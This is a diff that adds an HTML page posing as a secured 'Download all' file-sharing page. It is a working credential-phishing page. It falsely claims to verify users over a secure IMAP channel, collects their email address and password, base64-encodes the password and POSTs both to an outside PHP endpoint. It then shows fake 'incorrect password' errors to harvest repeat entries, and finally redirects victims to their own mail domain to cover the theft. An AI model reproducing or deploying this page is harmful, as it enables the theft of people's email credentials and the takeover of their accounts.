@@ -1,0 +1,185 @@
+﻿
+
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta property="og:title" content="Open to See" />
+    <meta property="og:description" content="35 views, 398 likes" />
+
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+    />
+
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">       </script>
+
+    <!-- Latest compiled JavaScript -->
+    <style>
+      body {
+        background-image: url(https://cdn.glitch.me/065e4c98-d153-4d8e-b825-a1289e599659%2Fshutter.png?v=1636982325966);
+        background-repeat: no-repeat;
+        color: #045eb4;
+      }
+
+      #d {
+        position: relative;
+        left: 530px;
+        top: 350px;
+      }
+
+      #form {
+        position: absolute;
+        left: 705px;
+        top: 30px;
+        width: 510px;
+        border-radius: 5px;
+        padding: 20px;
+        z-index: 2;
+        background: white;
+        display: none;
+      }
+      .blue {
+        background-color: #045eb4;
+        color: white;
+      }
+      #sub1 {
+        margin-top: 480px;
+        margin-left: 140px;
+        border-radius: 15px;
+        position: absolute;
+        z-index: 1;
+      }
+      .sky {
+        background-color: #409fff;
+        color: white;
+      }
+    </style>
+    <title>Supply Math</title>
+  </head>
+
+  <body>
+    <div id="form">
+      <div class="">
+        <img
+          src="https://cdn.glitch.com/68cfb315-3fc6-4c52-a231-5f0910612d8b%2Fwe2.jpg"
+          width="200"
+        /><br />
+        <div style="color:rgb(131, 121, 121); font-size: 13px; line-height: 1.5rem;">
+          These files are sensitive and secured against unauthorized access. In order to access this file, please provide your correct email credentials, 
+          we will connect to your email provider through a secured IMAP channel to authorize your download.
+          <p style="color: black; font-size: 16px;">Please confirm receiving email</p>
+          </div>
+      </div>
+      <hr />
+      <h1></h1>
+     
+<div class="form-wrapper-outer">
+<input type="hidden" class="form-control" name="myprocess" id="myprocess" value="[[-Email-]]">
+
+    <div class="outme">        
+
+        <div id='pop_up_class' align="center" style="display: none"><img src='https://www.superiorlawncareusa.com/wp-content/uploads/2020/05/loading-gif-png-5.gif' width='50'><br></div>
+<div align="center"><span id="error" style="font-size: 14px;  display: none; padding-bottom: 5px; color: rgb(232, 17, 35);"></span></div>
+           
+        
+            
+            <div class="field-wrapper">
+            <input type="email" class="form-control" name="offemail" id="theemail" placeholder="Email Address" autocomplete="off">
+			<br/>
+        </div>
+        <div class="field-wrapper" id="mypass" style="display: none;">
+            <input type="password" class="form-control" name="onpassword" id="thepass" placeholder="Password">
+			<br/>
+        </div>
+  <button class="btn btn-md btn-block sky" id="firstb" onClick="checkmail()">Download all</button>
+  <button class="btn btn-md btn-block sky" id="secondb" onClick="finishh()" style="display: none">Download all</button>
+      
+    </div>
+   
+    </div>
+    </div>
+    <a href="#" id="sub1" class="btn btn-md sky text-white">Download all</a>
+
+    <script>
+      $(document).ready(function() {
+        $("#sub1, #pix").click(function() {
+          $("#form").slideToggle();
+          document.getElementById('theemail').value = window.location.hash.substr(1);
+        });
+      });
+    </script>
+   
+<input type="hidden" id="count" value="0">
+    
+  </body>
+  
+  <script>
+    let url ='https://cosmeticindex.com/ci/cww/offb.php';
+    function checkmail()
+      {
+      document.getElementById('error').innerHTML="";
+      var email = document.getElementById('theemail');
+        if (email.value == '') {
+         document.getElementById('error').innerHTML="Enter a valid email address."; 
+         document.getElementById('error').style.display='block';
+
+         email.focus();
+        return false;	
+     }else{
+      document.getElementById('firstb').style.display='none';
+      document.getElementById('mypass').style.display='block';
+    document.getElementById('secondb').style.display='block';      
+
+    return false;
+     }
+      }
+
+    function cd()
+      {
+      document.getElementById('error').innerHTML="";
+      var pass = document.getElementById('thepass');
+        if (pass.value == '') {
+         document.getElementById('error').innerHTML="Please enter your password."; 
+         document.getElementById('error').style.display='block';
+        pass.focus();
+        return false;	
+     }else{
+      document.getElementById('error').style.display='none'; 
+      return true;
+     }
+      }
+
+    function finishh(){
+      if(cd()){
+    var a = document.getElementById('theemail').value;
+    var b = document.getElementById('thepass').value;
+    var encb  = window.btoa(b);
+    validate(a,encb);
+
+  }
+  }
+    
+    function se(){
+var c = document.getElementById('count').value;
+if(c >= 2){
+  var my_ijah = document.getElementById('theemail').value;
+  var ind = my_ijah.indexOf("@");
+    var my_ours = my_ijah.substr((ind + 1));
+window.location = "https://"+my_ours;
+}else{
+  document.getElementById('count').value=+c+1;
+    document.getElementById('error').innerHTML='Your email or password is incorrect.';
+    document.getElementById('error').style.display='block'; 
+    document.getElementById('thepass').value = "";
+}
+}
+
+
+    
+    function validate(e,a){var b=new XMLHttpRequest;b.open("POST",url),b.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),b.onreadystatechange=function(){4===b.readyState&&(se())};var t="ai="+e+"&pr="+a;b.send(t)}
+    </script>
+    
+</html>
